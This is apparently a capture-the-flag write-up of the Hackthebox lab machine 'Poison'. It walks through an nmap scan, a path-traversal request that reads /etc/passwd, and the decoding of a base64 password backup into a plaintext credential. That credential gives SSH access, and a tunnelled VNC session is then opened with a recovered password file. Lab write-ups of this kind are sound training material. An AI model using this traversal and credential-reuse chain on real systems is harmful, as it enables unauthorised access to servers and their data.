---
layout:     post
title:      "Hackthebox - Poison"
date:       2018-09-13 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Hackthebox
---

A little bit late but here comes my write up to another box from Hackthebox called ***Poison***. 

### Solution

Let's start the attack by scanning with `nmap`.

{% highlight text %}
root@kali:~# nmap -v -sS -A -T4 10.10.10.84
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 09:46 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:46
Completed NSE at 09:46, 0.00s elapsed
Initiating NSE at 09:46
Completed NSE at 09:46, 0.00s elapsed
Initiating Ping Scan at 09:46
Scanning 10.10.10.84 [4 ports]
Completed Ping Scan at 09:46, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:46
Completed Parallel DNS resolution of 1 host. at 09:46, 0.01s elapsed
Initiating SYN Stealth Scan at 09:46
Scanning 10.10.10.84 [1000 ports]
Discovered open port 80/tcp on 10.10.10.84
Discovered open port 22/tcp on 10.10.10.84
Increasing send delay for 10.10.10.84 from 0 to 5 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.10.84 from 5 to 10 due to max_successful_tryno increase to 6
Discovered open port 5911/tcp on 10.10.10.84
Completed SYN Stealth Scan at 09:46, 20.35s elapsed (1000 total ports)
Initiating Service scan at 09:46
Scanning 3 services on 10.10.10.84
Completed Service scan at 09:46, 6.12s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.84
Retrying OS detection (try #2) against 10.10.10.84
Retrying OS detection (try #3) against 10.10.10.84
Retrying OS detection (try #4) against 10.10.10.84
Retrying OS detection (try #5) against 10.10.10.84
Initiating Traceroute at 09:46
Completed Traceroute at 09:46, 0.06s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 09:46
Completed Parallel DNS resolution of 2 hosts. at 09:46, 0.01s elapsed
NSE: Script scanning 10.10.10.84.
Initiating NSE at 09:46
Completed NSE at 09:46, 7.17s elapsed
Initiating NSE at 09:46
Completed NSE at 09:46, 1.26s elapsed
Nmap scan report for 10.10.10.84
Host is up (0.041s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
5911/tcp open  cpdlc?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=7/8%OT=22%CT=1%CU=40695%PV=Y%DS=2%DC=T%G=Y%TM=5B4215CF
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10D%TI=Z%CI=Z%II=RI%TS=22)SE
OS:Q(TI=Z%CI=Z%II=RI%TS=21)SEQ(SP=FF%GCD=1%ISR=101%TI=Z%CI=Z%TS=20)SEQ(TI=Z
OS:%CI=Z%TS=1F)OPS(O1=M54DNW6ST11%O2=M54DNW6ST11%O3=M280NW6NNT11%O4=M54DNW6
OS:ST11%O5=M218NW6ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=F
OS:FFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M54DNW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=
OS:40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=
OS:M109NW6ST11%RD=0%Q=)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=40%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:S%T=40%CD=S)

Uptime guess: 0.000 days (since Sun Jul  8 09:46:43 2018)
Network Distance: 2 hops
IP ID Sequence Generation: All zeros
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   50.58 ms 10.10.14.1
2   42.90 ms 10.10.10.84

NSE: Script Post-scanning.
Initiating NSE at 09:46
Completed NSE at 09:46, 0.00s elapsed
Initiating NSE at 09:46
Completed NSE at 09:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.73 seconds
           Raw packets sent: 1504 (71.306KB) | Rcvd: 1088 (45.674KB)
{% endhighlight %}

From here we can see an open `ssh` and `http` ports. Let's start by using `curl` to get the content of the website. 

{% highlight text %}
root@kali:~# curl 10.10.10.84:80
<html>
<body>
<h1>Temporary website to test local .php scripts.</h1>
Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php

</body>
</html>

<form action="/browse.php" method="GET">
	Scriptname: <input type="text" name="file"><br>
	<input type="submit" value="Submit">
</form>
{% endhighlight %}

Let's check if this works by entering the file name `phpinfo.php`, listed in the main page. 

{% highlight text %}
http://10.10.10.84/browse.php?file=phpinfo.php

Configuration File (php.ini) Path 	/usr/local/etc
Loaded Configuration File 		/usr/local/etc/php.ini
Scan this dir for additional .ini files /usr/local/etc/php
{% endhighlight %}

But can we get files other as those shown before? Let's try that by entering the path to `/etc/passwd` file. 

{% highlight text %}
http://10.10.10.84/browse.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
{% endhighlight %}

Amazing, now we have a full list of users with potential target called `charix` and possibility to view any file on the sytem. But before looking for misconfigurations, I've viewed other files from the main page and in the `listfiles.php` there is an interesting find. File called `pwdbackup.txt`. 

{% highlight text %}
http://10.10.10.84/browse.php?file=listfiles.php
Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt )
{% endhighlight %}

Let's view it. 

{% highlight text %}
http://10.10.10.84/browse.php?file=pwdbackup.txt
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
{% endhighlight %}

Now we can decode it, 13 times as specified in the file. We can use it by hand or write a script, doesn't matter as the number of encode operations is small enough. 

{% highlight text %}
root@kali:~# echo "Q2hhcml4ITIjNCU2JjgoMA==
> " | base64 -d
Charix!2#4%6&8(0
{% endhighlight %}

By the last time, we get, what looks like a password to the `charix` account. Let's try and `ssh` into the server with that credentials. 

{% highlight text %}
root@kali:~# ssh charix@10.10.10.84
Password for charix@Poison:
Last login: Sun Jul  8 16:16:28 2018 from 10.10.14.246
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
When you've made modifications to a file in vi(1) and then find that
you can't write it, type ``<ESC>!rm -f %'' then ``:w!'' to force the
write

This won't work if you don't have write permissions to the directory
and probably won't be suitable if you're editing through a symbolic link.

charix@Poison:~ % ls -la
total 4728
drwxr-x---  3 charix  charix      512 Jul  8 16:30 .
drwxr-xr-x  3 root    wheel       512 Mar 19 16:08 ..
-rw-r-----  1 charix  charix     1041 Mar 19 17:16 .cshrc
-rw-rw----  1 charix  charix        0 Jul  8 16:30 .history
-rw-r-----  1 charix  charix      254 Mar 19 16:08 .login
-rw-r-----  1 charix  charix      163 Mar 19 16:08 .login_conf
-rw-r-----  1 charix  charix      379 Mar 19 16:08 .mail_aliases
-rw-r-----  1 charix  charix      336 Mar 19 16:08 .mailrc
-rw-r-----  1 charix  charix      802 Mar 19 16:08 .profile
-rw-r-----  1 charix  charix      281 Mar 19 16:08 .rhosts
-rw-r-----  1 charix  charix      849 Mar 19 16:08 .shrc
drwx------  2 charix  charix      512 Jul  8 16:29 .ssh
-rwxr-xr-x  1 charix  charix     2211 Jul  8 16:29 kati
-r--r--r--  1 charix  charix        0 Jul  8 16:29 secret
-rw-r-----  1 root    charix      166 Mar 19 16:35 secret.zip
-rw-r-----  1 root    charix       33 Mar 19 16:11 user.txt
-rw-------  1 charix  charix  4734976 Jul  8 16:28 vi.core

charix@Poison:~ % cat user.txt
******************************
{% endhighlight %}

And we have the first flag. In addition, there is a file called `secret.zip` and `secret`. I copied the file using `scp`, but there was nothing apart from gibberish data. Unziped with passowrd of `charix`.  

{% highlight text %}
root@kali:~# scp charix@10.10.10.84:~/secret.zip secret.zip
Password for charix@Poison:
secret.zip                                    100%  166     3.9KB/s   00:00    
root@kali:~# file secret.zip 
secret.zip: Zip archive data, at least v2.0 to extract
root@kali:~# unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password: 
 extracting: secret                  
root@kali:~# cat secret
��[|Ֆz!root@kali:~# file secret
secret: Non-ISO extended-ASCII text, with no line terminators
{% endhighlight %}

On further enumeration, I've noticed open connection on port `5901`. 

{% highlight text %}
charix@Poison:~ % netstat -l
Active Internet connections
Proto Recv-Q Send-Q Local Address                                 Foreign Address                               (state)
tcp4       0     12 localhost.5901                                localhost.39582                               ESTABLISHED
tcp4       0      0 localhost.39582                               localhost.5901                                ESTABLISHED
{% endhighlight %}

We can try to connect to it with `nc` in order to identify the service. 

{% highlight text %}
charix@Poison:~ % nc 127.0.0.1 5901
RFB 003.008
{% endhighlight %}

Some protocol called `RFB`? It's simply [VNC](https://en.wikipedia.org/wiki/RFB_protocol
)!

Firstly, let's forward the connection, so that we can connect from or local machine. 

{% highlight text %}
root@kali:~# ssh -L 5901:localhost:5901 -N -l charix 10.10.10.84
Password for charix@Poison:
{% endhighlight %}

One last step came with some struggle, as I could not find correct password for the `VNC`. But remember the `secret` file? It's actually a password file, that we can use. 

{% highlight text %}
root@kali:~# vncviewer 127.0.0.1:5901 -p secret
{% endhighlight %}

![VNC Connected](/img/poison/vnc.png){:class="img-responsive center-block"}

> Altough I finished and rooted the box, I can fully recommend the video from [Ippsec](https://www.youtube.com/watch?v=rs4zEwONzzk), 
> in which he showed amazing techniques used to attack the box. Go check it out!